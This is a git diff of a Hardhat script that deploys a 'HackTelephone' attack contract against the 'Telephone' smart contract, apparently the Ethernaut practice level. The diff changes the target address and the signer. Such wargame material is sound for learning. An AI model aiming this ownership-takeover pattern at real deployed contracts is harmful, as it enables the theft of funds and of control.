@@ -8,7 +8,7 @@ const hre = require("hardhat");
 async function main() {
   // 👉 Contract name and address
   const contractName = "Telephone";
-  const contractAddress = "0xdaBFc64410CEF846a9A74a0875A4dEb9599b8F91";
+  const contractAddress = "0xcD4CaB09225C5C3052FE8C8D0714F9b4aE1B5Ce1";
 
   // We get the contract to be hacked
   const contract = await hre.ethers.getContractAt(
@@ -21,14 +21,13 @@ async function main() {
   console.log(`🙍‍♂️ Owner:\n ${owner} \n`);
 
   // Get accounts
-  const [deployerSigner, hackerSigner] = await hre.ethers.getSigners();
-  console.log(`🙍‍♂️ Deployer address:\n ${deployerSigner.address} \n`);
+  const [hackerSigner] = await hre.ethers.getSigners();
   console.log(`🤓 Hacker address:\n ${hackerSigner.address} \n`);
 
   // We get the contract to deploy
   const HackContract = await hre.ethers.getContractFactory(
     "HackTelephone",
-    deployerSigner
+    hackerSigner
   );
   const hackContract = await HackContract.deploy(contractAddress);
 
